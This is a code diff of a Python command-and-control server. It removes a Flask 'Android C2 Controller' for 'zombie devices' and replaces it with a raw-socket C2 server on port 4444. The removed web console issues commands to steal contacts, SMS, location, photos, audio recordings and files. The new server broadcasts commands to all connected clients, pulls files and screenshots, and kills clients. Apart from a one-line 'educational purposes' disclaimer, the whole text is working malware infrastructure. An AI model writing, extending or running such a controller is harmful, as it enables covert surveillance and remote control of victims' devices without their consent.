@@ -1,518 +1,455 @@
 #!/usr/bin/env python3
 """
-ANDROID C2 CONTROLLER
-Server for controlling Android zombie devices
+C2 SERVER - Simple Command & Control Server
+Listens for clients and forwards commands from console
 Educational purposes only
 """
 
-import os
-import sys
+import socket
+import threading
 import json
 import time
-import threading
-import base64
-from datetime import datetime
-from flask import Flask, request, jsonify, render_template
-from flask_socketio import SocketIO, emit
-import uuid
+import select
+import sys
+from typing import Dict, List
+from dataclasses import dataclass, asdict
+import os
 
-app = Flask(__name__)
-app.config['SECRET_KEY'] = 'android-c2-secret-key'
-socketio = SocketIO(app, cors_allowed_origins="*")
+@dataclass
+class Client:
+    id: str
+    socket: socket.socket
+    address: tuple
+    info: dict
+    last_seen: float
+    online: bool = True
 
-# Store Android devices
-android_devices = {}
-device_commands = {}
-device_results = {}
-
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-
-BANNER = f"""
-{Colors.CYAN}
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║    █████╗ ███╗   ██╗██████╗ ██████╗  ██████╗ ██╗██████╗     ║
-║   ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗    ║
-║   ███████║██╔██╗ ██║██║  ██║██████╔╝██║   ██║██║██║  ██║    ║
-║   ██╔══██║██║╚██╗██║██║  ██║██╔══██╗██║   ██║██║██║  ██║    ║
-║   ██║  ██║██║ ╚████║██████╔╝██████╔╝╚██████╔╝██║██████╔╝    ║
-║   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═════╝  ╚═════╝ ╚═╝╚═════╝     ║
-║                                                              ║
-║               ANDROID C2 CONTROLLER v2.0                     ║
-║               Remote Device Management                       ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}
-"""
-
-# Android-specific routes
-@app.route('/api/android/register', methods=['POST'])
-def android_register():
-    """Register new Android device"""
-    data = request.json
-    device_id = data.get('device_id')
-    
-    if not device_id:
-        return jsonify({'success': False, 'error': 'Device ID required'})
-    
-    android_devices[device_id] = {
-        'device_id': device_id,
-        'model': data.get('model', 'Unknown'),
-        'brand': data.get('brand', 'Unknown'),
-        'android_version': data.get('android_version', 'Unknown'),
-        'sdk_version': data.get('sdk_version', 0),
-        'manufacturer': data.get('manufacturer', 'Unknown'),
-        'registered_at': datetime.now().isoformat(),
-        'last_seen': datetime.now().isoformat(),
-        'status': 'online',
-        'capabilities': data.get('capabilities', {}),
-        'battery': 0,
-        'network': 'unknown',
-        'location': None,
-        'rooted': data.get('rooted', False)
-    }
-    
-    device_commands[device_id] = []
-    device_results[device_id] = []
-    
-    print(f"{Colors.GREEN}[+] Android device registered:{Colors.ENDC}")
-    print(f"    Device ID: {Colors.CYAN}{device_id}{Colors.ENDC}")
-    print(f"    Model: {data.get('model')} ({data.get('android_version')})")
-    print(f"    Brand: {data.get('brand')}")
-    print(f"    Rooted: {data.get('rooted', False)}")
-    print(f"    Capabilities: {json.dumps(data.get('capabilities', {}))}")
-    
-    # Notify web clients
-    socketio.emit('android_connected', android_devices[device_id])
-    
-    return jsonify({'success': True, 'message': 'Device registered'})
-
-@app.route('/api/android/heartbeat', methods=['POST'])
-def android_heartbeat():
-    """Handle Android device heartbeat"""
-    data = request.json
-    device_id = data.get('device_id')
-    
-    if device_id in android_devices:
-        android_devices[device_id]['last_seen'] = datetime.now().isoformat()
-        android_devices[device_id]['status'] = 'online'
+class C2Server:
+    def __init__(self, host='0.0.0.0', port=4444, console_port=5555):
+        self.host = host
+        self.port = port
+        self.console_port = console_port
+        self.clients: Dict[str, Client] = {}
+        self.client_lock = threading.Lock()
+        self.running = True
+        self.console_socket = None
         
-        # Update device info
-        if 'battery' in data:
-            android_devices[device_id]['battery'] = data['battery']
-        if 'network' in data:
-            android_devices[device_id]['network'] = data['network']
-        if 'location' in data:
-            android_devices[device_id]['location'] = data['location']
+        # Colors for terminal
+        self.COLORS = {
+            'RED': '\033[91m',
+            'GREEN': '\033[92m',
+            'YELLOW': '\033[93m',
+            'BLUE': '\033[94m',
+            'CYAN': '\033[96m',
+            'END': '\033[0m',
+        }
+    
+    def print_banner(self):
+        """Print server banner"""
+        banner = f"""
+{self.COLORS['CYAN']}
+╔═══════════════════════════════════════════╗
+║        SIMPLE C2 SERVER                   ║
+║     Console Port: {self.console_port:<6}           ║
+║     Client Port:  {self.port:<6}           ║
+╚═══════════════════════════════════════════╝
+{self.COLORS['END']}
+        """
+        print(banner)
+    
+    def start(self):
+        """Start the C2 server"""
+        self.print_banner()
         
-        # Notify web clients
-        socketio.emit('android_heartbeat', {
-            'device_id': device_id,
-            'battery': data.get('battery'),
-            'timestamp': data.get('timestamp')
-        })
-    
-    return jsonify({'success': True})
-
-@app.route('/api/android/commands')
-def get_android_commands():
-    """Get pending commands for Android device"""
-    device_id = request.args.get('device_id')
-    
-    if device_id in device_commands:
-        commands = device_commands[device_id].copy()
-        device_commands[device_id] = []  # Clear after sending
-        return jsonify({'commands': commands})
-    
-    return jsonify({'commands': []})
-
-@app.route('/api/android/result', methods=['POST'])
-def android_command_result():
-    """Handle command result from Android device"""
-    data = request.json
-    device_id = data.get('device_id')
-    command_id = data.get('command_id')
-    
-    result_entry = {
-        'device_id': device_id,
-        'command_id': command_id,
-        'command': data.get('command'),
-        'result': data.get('result'),
-        'timestamp': datetime.now().isoformat()
-    }
-    
-    if device_id in device_results:
-        device_results[device_id].append(result_entry)
-    
-    print(f"{Colors.CYAN}[*] Result from Android {device_id}:{Colors.ENDC}")
-    print(f"    Command: {data.get('command')}")
-    print(f"    Result: {data.get('result')[:100]}...")
-    
-    # Notify web clients
-    socketio.emit('android_result', result_entry)
-    
-    return jsonify({'success': True})
-
-@app.route('/api/android/command', methods=['POST'])
-def send_android_command():
-    """Send command to Android device"""
-    data = request.json
-    device_id = data.get('device_id')
-    command = data.get('command')
-    
-    if not device_id or not command:
-        return jsonify({'success': False, 'error': 'Device ID and command required'})
-    
-    if device_id not in android_devices:
-        return jsonify({'success': False, 'error': 'Device not registered'})
-    
-    command_id = str(uuid.uuid4())
-    cmd_entry = {
-        'id': command_id,
-        'command': command,
-        'timestamp': datetime.now().isoformat()
-    }
-    
-    if device_id not in device_commands:
-        device_commands[device_id] = []
-    
-    device_commands[device_id].append(cmd_entry)
-    
-    print(f"{Colors.YELLOW}[*] Command sent to Android {device_id}:{Colors.ENDC}")
-    print(f"    Command: {command}")
-    
-    return jsonify({'success': True, 'command_id': command_id})
-
-@app.route('/api/android/devices')
-def get_android_devices():
-    """Get all registered Android devices"""
-    return jsonify(list(android_devices.values()))
-
-@app.route('/api/android/device/<device_id>')
-def get_android_device(device_id):
-    """Get specific Android device info"""
-    if device_id in android_devices:
-        return jsonify(android_devices[device_id])
-    return jsonify({'error': 'Device not found'}), 404
-
-@app.route('/api/android/device/<device_id>/results')
-def get_android_results(device_id):
-    """Get command results for device"""
-    if device_id in device_results:
-        return jsonify(device_results[device_id])
-    return jsonify([])
-
-@app.route('/api/android/send_file', methods=['POST'])
-def send_file_to_device():
-    """Send file to Android device"""
-    data = request.json
-    device_id = data.get('device_id')
-    filename = data.get('filename')
-    file_data = data.get('data')  # base64 encoded
-    
-    if not all([device_id, filename, file_data]):
-        return jsonify({'success': False, 'error': 'Missing parameters'})
-    
-    # Store file for device to download
-    if device_id not in device_commands:
-        device_commands[device_id] = []
-    
-    command_id = str(uuid.uuid4())
-    cmd_entry = {
-        'id': command_id,
-        'command': f'download:{filename}',
-        'file_data': file_data,
-        'timestamp': datetime.now().isoformat()
-    }
-    
-    device_commands[device_id].append(cmd_entry)
-    
-    return jsonify({'success': True, 'command_id': command_id})
-
-@app.route('/api/android/download_file', methods=['POST'])
-def download_from_device():
-    """Handle file upload from Android device"""
-    data = request.json
-    device_id = data.get('device_id')
-    filename = data.get('filename')
-    file_data = data.get('data')  # base64 encoded
-    
-    # Save file
-    try:
-        os.makedirs('downloads', exist_ok=True)
-        file_path = f"downloads/{device_id}_{filename}"
+        # Start client listener
+        client_thread = threading.Thread(target=self.listen_for_clients, daemon=True)
+        client_thread.start()
         
-        with open(file_path, 'wb') as f:
-            f.write(base64.b64decode(file_data))
+        # Start console listener
+        console_thread = threading.Thread(target=self.listen_for_console, daemon=True)
+        console_thread.start()
         
-        print(f"{Colors.GREEN}[+] File received from {device_id}:{Colors.ENDC}")
-        print(f"    File: {filename}")
-        print(f"    Saved to: {file_path}")
+        # Start cleanup thread
+        cleanup_thread = threading.Thread(target=self.cleanup_clients, daemon=True)
+        cleanup_thread.start()
         
-        return jsonify({'success': True, 'path': file_path})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# Android Console Interface
-@app.route('/android_console')
-def android_console():
-    """Android device console interface"""
-    return '''
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Android C2 Console</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Courier New', monospace;
-            background: #0a0e27;
-            color: #00ff00;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-        .devices-panel, .command-panel, .output-panel {
-            background: #1a1f3a;
-            padding: 20px;
-            border-radius: 10px;
-            border: 2px solid #00ff00;
-            margin-bottom: 20px;
-        }
-        .device-card {
-            background: #0d1117;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border-left: 4px solid #00ff00;
-            cursor: pointer;
-        }
-        .device-card.selected {
-            border-left-color: #00ffff;
-            background: #0a0d14;
-        }
-        .command-input {
-            width: 100%;
-            padding: 10px;
-            background: #0d1117;
-            border: 2px solid #00ff00;
-            color: #00ff00;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-        button {
-            padding: 10px 20px;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        .output {
-            max-height: 400px;
-            overflow-y: auto;
-            padding: 10px;
-            background: #0d1117;
-            border-radius: 5px;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>📱 Android C2 Console</h1>
-        <p>Control Android Zombie Devices</p>
-    </div>
-    
-    <div class="devices-panel">
-        <h2>📱 Connected Devices</h2>
-        <div id="devices-list"></div>
-    </div>
-    
-    <div class="command-panel">
-        <h2>💻 Command Center</h2>
-        <select id="command-select" class="command-input">
-            <option value="">Select a command...</option>
-            <option value="get_info">Get Device Info</option>
-            <option value="shell:ls /sdcard">List Files</option>
-            <option value="get_contacts">Get Contacts</option>
-            <option value="get_sms">Get SMS</option>
-            <option value="get_location">Get Location</option>
-            <option value="take_picture">Take Picture</option>
-            <option value="record_audio">Record Audio (10s)</option>
-            <option value="get_apps">Get Installed Apps</option>
-        </select>
-        <input type="text" id="custom-command" class="command-input" placeholder="Or enter custom command...">
-        <div>
-            <button onclick="sendCommand()">Send Command</button>
-            <button onclick="sendSMS()">Send SMS</button>
-            <button onclick="takeScreenshot()">Take Screenshot</button>
-            <button onclick="recordAudio()">Record Audio</button>
-        </div>
-    </div>
-    
-    <div class="output-panel">
-        <h2>📊 Command Output</h2>
-        <div id="output" class="output"></div>
-    </div>
-    
-    <script>
-        let selectedDevice = null;
-        let devices = {};
+        print(f"{self.COLORS['GREEN']}[+] Server started{self.COLORS['END']}")
+        print(f"    Client port: {self.port}")
+        print(f"    Console port: {self.console_port}")
+        print(f"\n{self.COLORS['YELLOW']}[*] Waiting for connections...{self.COLORS['END']}\n")
         
-        // Load devices
-        function loadDevices() {
-            fetch('/api/android/devices')
-                .then(r => r.json())
-                .then(data => {
-                    devices = {};
-                    data.forEach(d => devices[d.device_id] = d);
-                    updateDevicesList();
-                });
-        }
-        
-        // Update devices list
-        function updateDevicesList() {
-            const container = document.getElementById('devices-list');
-            container.innerHTML = '';
+        # Keep main thread alive
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            self.shutdown()
+    
+    def listen_for_clients(self):
+        """Listen for incoming client connections"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind((self.host, self.port))
+            sock.listen(100)
             
-            Object.values(devices).forEach(device => {
-                const card = document.createElement('div');
-                card.className = 'device-card';
-                if (selectedDevice === device.device_id) {
-                    card.classList.add('selected');
+            while self.running:
+                try:
+                    client_sock, addr = sock.accept()
+                    client_thread = threading.Thread(
+                        target=self.handle_client,
+                        args=(client_sock, addr),
+                        daemon=True
+                    )
+                    client_thread.start()
+                except:
+                    continue
+        except Exception as e:
+            print(f"{self.COLORS['RED']}[-] Client listener error: {e}{self.COLORS['END']}")
+    
+    def listen_for_console(self):
+        """Listen for console connections"""
+        try:
+            self.console_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.console_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.console_socket.bind((self.host, self.console_port))
+            self.console_socket.listen(5)
+            
+            while self.running:
+                try:
+                    console_sock, addr = self.console_socket.accept()
+                    console_thread = threading.Thread(
+                        target=self.handle_console,
+                        args=(console_sock, addr),
+                        daemon=True
+                    )
+                    console_thread.start()
+                except:
+                    continue
+        except Exception as e:
+            print(f"{self.COLORS['RED']}[-] Console listener error: {e}{self.COLORS['END']}")
+    
+    def handle_client(self, sock: socket.socket, addr: tuple):
+        """Handle a connected client"""
+        client_id = None
+        
+        try:
+            # Receive client info
+            data = self.recv_data(sock)
+            if not data:
+                sock.close()
+                return
+            
+            client_info = json.loads(data)
+            client_id = client_info.get('id', f"{addr[0]}:{addr[1]}")
+            
+            # Create client object
+            client = Client(
+                id=client_id,
+                socket=sock,
+                address=addr,
+                info=client_info,
+                last_seen=time.time()
+            )
+            
+            # Add to clients dict
+            with self.client_lock:
+                self.clients[client_id] = client
+            
+            print(f"{self.COLORS['GREEN']}[+] Client connected: {client_id}{self.COLORS['END']}")
+            print(f"    Address: {addr[0]}:{addr[1]}")
+            print(f"    OS: {client_info.get('os', 'Unknown')}")
+            print(f"    Hostname: {client_info.get('hostname', 'Unknown')}")
+            
+            # Send acknowledgment
+            ack = {'status': 'connected', 'message': 'Welcome to C2'}
+            self.send_data(sock, ack)
+            
+            # Main client loop
+            while self.running and client.online:
+                try:
+                    # Check for commands from server
+                    if sock in select.select([sock], [], [], 1)[0]:
+                        data = self.recv_data(sock)
+                        if not data:
+                            break
+                        
+                        message = json.loads(data)
+                        
+                        if message.get('type') == 'result':
+                            # Command result from client
+                            print(f"\n{self.COLORS['CYAN']}[*] Result from {client_id}:{self.COLORS['END']}")
+                            print(f"    Command: {message.get('command')}")
+                            print(f"    Output:\n{message.get('output')}")
+                            print(f"{'─'*50}")
+                        
+                        elif message.get('type') == 'heartbeat':
+                            # Update last seen
+                            client.last_seen = time.time()
+                        
+                        elif message.get('type') == 'file':
+                            # File upload from client
+                            filename = message.get('filename')
+                            file_data = base64.b64decode(message.get('data'))
+                            
+                            # Save file
+                            os.makedirs('downloads', exist_ok=True)
+                            filepath = f"downloads/{client_id}_{filename}"
+                            with open(filepath, 'wb') as f:
+                                f.write(file_data)
+                            
+                            print(f"\n{self.COLORS['GREEN']}[+] File received from {client_id}:{self.COLORS['END']}")
+                            print(f"    File: {filename}")
+                            print(f"    Saved to: {filepath}")
+                            print(f"{'─'*50}")
+                
+                except (ConnectionError, json.JSONDecodeError):
+                    break
+                except Exception as e:
+                    print(f"Error with client {client_id}: {e}")
+                    continue
+        
+        except Exception as e:
+            print(f"Client handler error: {e}")
+        
+        finally:
+            # Remove client
+            if client_id:
+                with self.client_lock:
+                    if client_id in self.clients:
+                        del self.clients[client_id]
+                
+                print(f"{self.COLORS['RED']}[-] Client disconnected: {client_id}{self.COLORS['END']}")
+            
+            try:
+                sock.close()
+            except:
+                pass
+    
+    def handle_console(self, sock: socket.socket, addr: tuple):
+        """Handle console connection"""
+        try:
+            print(f"{self.COLORS['BLUE']}[+] Console connected: {addr[0]}:{addr[1]}{self.COLORS['END']}")
+            
+            # Send welcome message
+            welcome = {
+                'type': 'welcome',
+                'message': 'C2 Console',
+                'clients': len(self.clients)
+            }
+            self.send_data(sock, welcome)
+            
+            # Console command loop
+            while self.running:
+                try:
+                    # Receive command from console
+                    data = self.recv_data(sock)
+                    if not data:
+                        break
+                    
+                    command = json.loads(data)
+                    self.process_console_command(sock, command)
+                
+                except (ConnectionError, json.JSONDecodeError):
+                    break
+                except Exception as e:
+                    error_msg = {'type': 'error', 'message': str(e)}
+                    self.send_data(sock, error_msg)
+        
+        except Exception as e:
+            print(f"Console handler error: {e}")
+        
+        finally:
+            print(f"{self.COLORS['RED']}[-] Console disconnected: {addr[0]}:{addr[1]}{self.COLORS['END']}")
+            try:
+                sock.close()
+            except:
+                pass
+    
+    def process_console_command(self, sock: socket.socket, command: dict):
+        """Process command from console"""
+        cmd_type = command.get('type')
+        
+        if cmd_type == 'list':
+            # List all clients
+            with self.client_lock:
+                clients_list = []
+                for client_id, client in self.clients.items():
+                    clients_list.append({
+                        'id': client_id,
+                        'address': f"{client.address[0]}:{client.address[1]}",
+                        'info': client.info,
+                        'online': client.online,
+                        'last_seen': time.time() - client.last_seen
+                    })
+            
+            response = {'type': 'list', 'clients': clients_list}
+            self.send_data(sock, response)
+        
+        elif cmd_type == 'command':
+            # Send command to client
+            client_id = command.get('client_id')
+            cmd = command.get('command')
+            
+            if client_id == 'all':
+                # Send to all clients
+                with self.client_lock:
+                    for cid, client in self.clients.items():
+                        self.send_command_to_client(client, cmd)
+                
+                response = {'type': 'result', 'message': f"Command sent to {len(self.clients)} clients"}
+                self.send_data(sock, response)
+            
+            elif client_id in self.clients:
+                # Send to specific client
+                client = self.clients[client_id]
+                self.send_command_to_client(client, cmd)
+                
+                response = {'type': 'result', 'message': f"Command sent to {client_id}"}
+                self.send_data(sock, response)
+            
+            else:
+                response = {'type': 'error', 'message': f"Client {client_id} not found"}
+                self.send_data(sock, response)
+        
+        elif cmd_type == 'download':
+            # Request file from client
+            client_id = command.get('client_id')
+            filepath = command.get('filepath')
+            
+            if client_id in self.clients:
+                client = self.clients[client_id]
+                download_cmd = {
+                    'type': 'download',
+                    'filepath': filepath
                 }
-                card.onclick = () => {
-                    selectedDevice = device.device_id;
-                    updateDevicesList();
-                    addOutput(`Selected device: ${device.model} (${device.device_id})`);
-                };
+                self.send_data(client.socket, download_cmd)
                 
-                card.innerHTML = `
-                    <strong>${device.model}</strong> (${device.brand})<br>
-                    <small>ID: ${device.device_id}</small><br>
-                    <small>Android ${device.android_version} • Battery: ${device.battery || '?'}%</small><br>
-                    <small>Rooted: ${device.rooted ? 'Yes' : 'No'} • Last seen: ${new Date(device.last_seen).toLocaleTimeString()}</small>
-                `;
+                response = {'type': 'result', 'message': f"Download request sent to {client_id}"}
+                self.send_data(sock, response)
+            else:
+                response = {'type': 'error', 'message': f"Client {client_id} not found"}
+                self.send_data(sock, response)
+        
+        elif cmd_type == 'screenshot':
+            # Request screenshot from client
+            client_id = command.get('client_id')
+            
+            if client_id in self.clients:
+                client = self.clients[client_id]
+                screenshot_cmd = {'type': 'screenshot'}
+                self.send_data(client.socket, screenshot_cmd)
                 
-                container.appendChild(card);
-            });
-        }
+                response = {'type': 'result', 'message': f"Screenshot request sent to {client_id}"}
+                self.send_data(sock, response)
+            else:
+                response = {'type': 'error', 'message': f"Client {client_id} not found"}
+                self.send_data(sock, response)
         
-        // Send command
-        function sendCommand() {
-            if (!selectedDevice) {
-                addOutput('❌ Please select a device first');
-                return;
+        elif cmd_type == 'kill':
+            # Kill client connection
+            client_id = command.get('client_id')
+            
+            if client_id in self.clients:
+                client = self.clients[client_id]
+                kill_cmd = {'type': 'kill'}
+                self.send_data(client.socket, kill_cmd)
+                client.online = False
+                
+                response = {'type': 'result', 'message': f"Kill command sent to {client_id}"}
+                self.send_data(sock, response)
+            else:
+                response = {'type': 'error', 'message': f"Client {client_id} not found"}
+                self.send_data(sock, response)
+    
+    def send_command_to_client(self, client: Client, command: str):
+        """Send command to a client"""
+        try:
+            cmd_data = {
+                'type': 'command',
+                'command': command,
+                'timestamp': time.time()
             }
+            self.send_data(client.socket, cmd_data)
+        except:
+            client.online = False
+    
+    def send_data(self, sock: socket.socket, data: dict):
+        """Send JSON data over socket"""
+        try:
+            json_data = json.dumps(data).encode('utf-8')
+            length = len(json_data).to_bytes(4, 'big')
+            sock.sendall(length + json_data)
+        except:
+            raise ConnectionError("Failed to send data")
+    
+    def recv_data(self, sock: socket.socket) -> bytes:
+        """Receive JSON data from socket"""
+        try:
+            # Read message length
+            length_bytes = sock.recv(4)
+            if not length_bytes:
+                return None
             
-            const select = document.getElementById('command-select');
-            const custom = document.getElementById('custom-command');
-            const command = select.value || custom.value;
+            length = int.from_bytes(length_bytes, 'big')
             
-            if (!command) {
-                addOutput('❌ Please enter a command');
-                return;
-            }
+            # Read message data
+            data = b''
+            while len(data) < length:
+                chunk = sock.recv(min(4096, length - len(data)))
+                if not chunk:
+                    return None
+                data += chunk
             
-            fetch('/api/android/command', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    device_id: selectedDevice,
-                    command: command
-                })
-            })
-            .then(r => r.json())
-            .then(data => {
-                addOutput(`✅ Command sent: ${command}`);
-                custom.value = '';
-                select.value = '';
-            })
-            .catch(err => addOutput(`❌ Error: ${err}`));
-        }
-        
-        // Send SMS
-        function sendSMS() {
-            const number = prompt('Enter phone number:');
-            if (!number) return;
+            return data
+        except:
+            return None
+    
+    def cleanup_clients(self):
+        """Clean up disconnected clients"""
+        while self.running:
+            time.sleep(30)  # Check every 30 seconds
             
-            const message = prompt('Enter message:');
-            if (!message) return;
-            
-            const command = `sms:${number},${message}`;
-            document.getElementById('custom-command').value = command;
-            sendCommand();
-        }
+            with self.client_lock:
+                to_remove = []
+                for client_id, client in self.clients.items():
+                    if time.time() - client.last_seen > 60:  # 60 seconds timeout
+                        to_remove.append(client_id)
+                        print(f"{self.COLORS['YELLOW']}[*] Client timeout: {client_id}{self.COLORS['END']}")
+                
+                for client_id in to_remove:
+                    try:
+                        self.clients[client_id].socket.close()
+                    except:
+                        pass
+                    del self.clients[client_id]
+    
+    def shutdown(self):
+        """Shutdown the server"""
+        print(f"\n{self.COLORS['YELLOW']}[*] Shutting down server...{self.COLORS['END']}")
+        self.running = False
         
-        // Take screenshot
-        function takeScreenshot() {
-            document.getElementById('custom-command').value = 'take_picture';
-            sendCommand();
-        }
+        # Close all client sockets
+        with self.client_lock:
+            for client in self.clients.values():
+                try:
+                    client.socket.close()
+                except:
+                    pass
+            self.clients.clear()
         
-        // Record audio
-        function recordAudio() {
-            document.getElementById('custom-command').value = 'record_audio';
-            sendCommand();
-        }
+        # Close console socket
+        if self.console_socket:
+            try:
+                self.console_socket.close()
+            except:
+                pass
         
-        // Add output
-        function addOutput(text) {
-            const output = document.getElementById('output');
-            const line = document.createElement('div');
-            line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
-            output.appendChild(line);
-            output.scrollTop = output.scrollHeight;
-        }
-        
-        // WebSocket for real-time updates
-        const ws = new WebSocket(`ws://${window.location.hostname}:${window.location.port || 5000}`);
-        ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'android_connected') {
-                addOutput(`📱 New device connected: ${data.model}`);
-                loadDevices();
-            } else if (data.type === 'android_result') {
-                addOutput(`📨 Result from ${data.device_id}:`);
-                addOutput(data.result);
-            }
-        };
-        
-        // Initial load
-        loadDevices();
-        setInterval(loadDevices, 5000);
-    </script>
-</body>
-</html>
-    '''
+        print(f"{self.COLORS['RED']}[-] Server stopped{self.COLORS['END']}")
 
 def main():
-    print(BANNER)
-    host = '0.0.0.0'
-    port = 5000
-    
-    print(f"{Colors.GREEN}[+] Starting Android C2 Controller{Colors.ENDC}")
-    print(f"    Host: {host}")
-    print(f"    Port: {port}")
-    print(f"    Web Console: http://localhost:{port}/android_console")
-    print(f"\n{Colors.YELLOW}[*] Waiting for Android devices to connect...{Colors.ENDC}\n")
-    
-    socketio.run(app, host=host, port=port, debug=False, allow_unsafe_werkzeug=True)
+    server = C2Server(port=4444, console_port=5555)
+    server.start()
 
 if __name__ == '__main__':
     main()
